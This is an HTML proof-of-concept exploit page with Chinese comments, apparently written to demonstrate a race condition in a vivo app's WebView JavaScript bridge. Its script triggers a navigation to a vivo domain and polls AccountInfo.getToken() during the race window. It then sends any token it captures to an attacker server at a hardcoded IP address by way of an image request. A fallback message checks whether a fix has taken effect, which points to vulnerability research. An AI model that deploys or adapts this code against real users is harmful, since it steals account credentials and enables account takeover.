<!DOCTYPE html>
<html>
<body>
<h3 id="r">running...</h3>
<script>
const LOG = document.getElementById('r');
// 关键：触发导航但不等待完成，在竞态窗口内调桥
function attack() {
    // 1) 发起一次到 vivo 域的导航 → 触发 shouldOverrideUrlLoading
    //    → 宿主 :860 立即执行 mRealUrl = "https://video-activity.vivo.com.cn/..."
    location.href = 'https://bbs.vivo.com.cn/newbbs/link?target=' + Math.random();
    // 2) 不等待加载完成（旧页 JS 仍在执行 = 竞态窗口）
    //    轮询调用，只要任一次命中"回调已执行、新页未 commit"即成功
    let n = 0;
    const t = setInterval(() => {
        n++;
        let token = '';
        try { token = window.AccountInfo.getToken() || ''; } catch (e) {}
        if (token) {
            LOG.textContent = 'LEAKED[' + n + ']: ' + token.slice(0, 8) + '...';
            clearInterval(t);
            // 3) 立即外带到攻击者服务器
            new Image().src = 'http://172.22.228.83:8888/leak?token=' + encodeURIComponent(token);
            // 收手：把导航停回本页，便于现场演示
            history.back();
        } else if (n > 40) {
            LOG.textContent = 'blocked after ' + n + ' tries (修复生效?)';
            clearInterval(t);
        }
    }, 50);
}
attack();
</script>
</body>
</html>
